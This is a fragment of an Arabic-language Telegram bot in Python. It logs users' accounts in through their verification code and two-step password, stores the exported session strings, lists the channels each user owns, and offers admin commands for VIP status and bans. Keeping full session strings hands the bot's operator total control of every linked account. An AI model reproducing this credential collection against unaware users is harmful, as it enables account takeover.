                user_client = session_data['client']
                
                try:
                    await user_client.sign_in(
                        session_data['phone'],
                        session_data['phone_code_hash'],
                        code
                    )
                except SessionPasswordNeeded:
                    user_states[user_id] = "waiting_password"
                    await message.reply("أرسل كلمة المرور الثانية:")
                    return
                
                session_string = await user_client.export_session_string()
                update_user(user_id, session_string=session_string, phone=session_data['phone'])
                
                # البحث عن القنوات والمجموعات
                try:
                    async for dialog in user_client.get_dialogs():
                        if dialog.chat.type in ['channel', 'group']:
                            if dialog.chat.type == 'channel' and dialog.chat.is_creator:
                                add_channel(
                                    user_id,
                                    dialog.chat.id,
                                    dialog.chat.username,
                                    dialog.chat.title
                                )
                except:
                    pass
                
                await user_client.disconnect()
                del active_sessions[user_id]
                del user_states[user_id]
                
                await message.reply("✅ تم تسجيل الحساب بنجاح!", reply_markup=main_keyboard(user_id))
                
        except PhoneCodeInvalid:
            await message.reply("❌ كود التحقق غير صحيح، حاول مرة أخرى:")
        except Exception as e:
            await message.reply(f"❌ خطأ: {str(e)}")
    
    elif state == "waiting_password":
        try:
            password = message.text
            session_data = active_sessions.get(user_id)
            
            if session_data:
                user_client = session_data['client']
                await user_client.check_password(password)
                
                session_string = await user_client.export_session_string()
                update_user(user_id, session_string=session_string, phone=session_data['phone'])
                
                # البحث عن القنوات والمجموعات
                try:
                    async for dialog in user_client.get_dialogs():
                        if dialog.chat.type in ['channel', 'group']:
                            if dialog.chat.type == 'channel' and dialog.chat.is_creator:
                                add_channel(
                                    user_id,
                                    dialog.chat.id,
                                    dialog.chat.username,
                                    dialog.chat.title
                                )
                except:
                    pass
                
                await user_client.disconnect()
                del active_sessions[user_id]
                del user_states[user_id]
                
                await message.reply("✅ تم تسجيل الحساب بنجاح!", reply_markup=main_keyboard(user_id))
                
        except Exception as e:
            await message.reply(f"❌ خطأ: {str(e)}")
    
    elif state == "waiting_bio":
        bio = message.text
        update_user(user_id, bio=bio)
        del user_states[user_id]
        await message.reply("✅ تم تعيين النبذة بنجاح!", reply_markup=main_keyboard(user_id))
    
    # معالجة أوامر المدير
    elif user_id == ADMIN_ID and state:
        if state == "waiting_user_vip":
            try:
                target_id = int(message.text)
                update_user(target_id, vip=True)
                await message.reply(f"✅ تم تفعيل VIP للمستخدم {target_id}", reply_markup=admin_keyboard())
                del user_states[user_id]
            except:
                await message.reply("❌ معرف المستخدم غير صحيح")
        
        elif state == "waiting_user_unvip":
            try:
                target_id = int(message.text)
                update_user(target_id, vip=False)
                await message.reply(f"✅ تم إلغاء VIP للمستخدم {target_id}", reply_markup=admin_keyboard())
                del user_states[user_id]
            except:
                await message.reply("❌ معرف المستخدم غير صحيح")
        
        elif state == "waiting_user_ban":
            try:
                target_id = int(message.text)
                update_user(target_id, banned=True)
                await message.reply(f"✅ تم حظر المستخدم {target_id}", reply_markup=admin_keyboard())
                del user_states[user_id]
            except:
                await message.reply("❌ معرف المستخدم غير صحيح")
        
        elif state == "waiting_user_unban":
            try:
                target_id = int(message.text)
                update_user(target_id, banned=False)
                await message.reply(f"✅ تم إلغاء حظر المستخدم {target_id}", reply_markup=admin_keyboard())
                del user_states[user_id]
            except:
                await message.reply("❌ معرف المستخدم غير صحيح")
        
        elif state == "waiting_user_info":
            try:
                target_id = int(message.text)
                user_data = get_user(target_id)
                if user_data:
                    info = f"📋 معلومات المستخدم {target_id}:\n"
                    info += f"🎖️ VIP: {'نعم 🥇' if user_data[4] else 'لا'}\n"
                    info += f"🤖 الرد التلقائي: {'مفعل' if user_data[3] else 'معطل'}\n"
                    info += f"👥 عدد المدعوين: {user_data[5]}\n"
                    info += f"📞 رقم الهاتف: {user_data[6] or 'غير مسجل'}\n"
                    info += f"🚫 الحالة: {'محظور' if user_data[7] else 'نشط'}\n"
                    info += f"📅 تاريخ التسجيل: {user_data[8]}\n"
                    await message.reply(info, reply_markup=admin_keyboard())
                else:
                    await message.reply("❌ المستخدم غير موجود")
                del user_states[user_id]
            except:
                await message.reply("❌ معرف المستخدم غير صحيح")
    
    else:
        if user_id == ADMIN_ID and message.text == "/sos":
            await message.reply("👑 لوحة تحكم المدير:", reply_markup=admin_keyboard())
        elif user_id == ADMIN_ID and message.text.startswith("/"):
            # أوامر المدير النصية
            parts = message.text.split()
            if parts[0] == "/activate_vip" and len(parts) > 1:
                try:
                    target_id = int(parts[1])
                    update_user(target_id, vip=True)
                    await message.reply(f"✅ تم تفعيل VIP للمستخدم {target_id}")
                except:
                    await message.reply("❌ خطأ في رقم المستخدم")
            
            elif parts[0] == "/deactivate_vip" and len(parts) > 1:
                try:
                    target_id = int(parts[1])
                    update_user(target_id, vip=False)
                    await message.reply(f"✅ تم إيقاف VIP للمستخدم {target_id}")
                except:
                    await message.reply("❌ خطأ في رقم المستخدم")
            
            elif parts[0] == "/ban" and len(parts) > 1:
                try:
                    target_id = int(parts[1])
                    update_user(target_id, banned=True)
                    await message.reply(f"✅ تم حظر المستخدم {target_id}")
                except:
                    await message.reply("❌ خطأ في رقم المستخدم")
            
            elif parts[0] == "/unban" and len(parts) > 1:
                try:
                    target_id = int(parts[1])
                    update_user(target_id, banned=False)
                    await message.reply(f"✅ تم إلغاء حظر المستخدم {target_id}")
                except:
                    await message.reply("❌ خطأ في رقم المستخدم")

async def main():
    try:
        await app.start()
        print("✅ البوت يعمل بنجاح!")
        print("🔄 البوت جاهز لاستقبال الأوامر...")
        
        # عرض معلومات البوت
        bot_info = await app.get_me()
        print(f"🤖 اسم البوت: @{bot_info.username}")
        print(f"🔧 حالة البوت: {'✅ مفعل' if is_bot_enabled() else '⏸️ متوقف'}")
        print(f"🎯 وضع VIP: {'🍻 مفعل' if is_vip_mode() else '🍺 معطل'}")
        
        await idle()
        
    except Exception as e:
        print(f"❌ خطأ في التشغيل: {e}")
    finally:
        try:
            await app.stop()
            print("🛑 البوت توقف")
        except:
            pass

if __name__ == "__main__":
    # تشغيل البوت
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("🛑 تم إيقاف البوت بواسطة المستخدم")
    except Exception as e:
        print(f"❌ خطأ غير متوقع: {e}")
